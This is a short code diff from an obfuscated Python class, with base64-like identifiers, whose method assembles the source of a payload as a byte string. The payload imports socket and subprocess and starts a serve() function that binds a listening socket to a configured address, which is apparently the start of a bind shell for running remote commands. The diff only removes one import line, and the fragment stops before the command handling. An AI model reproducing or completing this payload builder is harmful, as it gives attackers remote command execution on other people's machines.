@@ -20,7 +20,6 @@ class eHhjemR5eXB:
     def dGVyeXB6Y2FjeH(self, dGR6eGFteXBxC):
         YWxmanRob  = b"from socket import socket, AF_INET, SOCK_STREAM"
         YWxmanRob += b"\nfrom subprocess import run, PIPE"
-        YWxmanRob += b"\nfrom os import _exit"
         YWxmanRob += b"\ndef serve():"
         YWxmanRob += b"\n\twith socket(AF_INET, SOCK_STREAM) as soc:"
         YWxmanRob += bytes(f"\n\t\tsoc.bind((\"{self.aWFmYXRye}\", {self.ZmFsa2p0aGM}))", "utf-8")
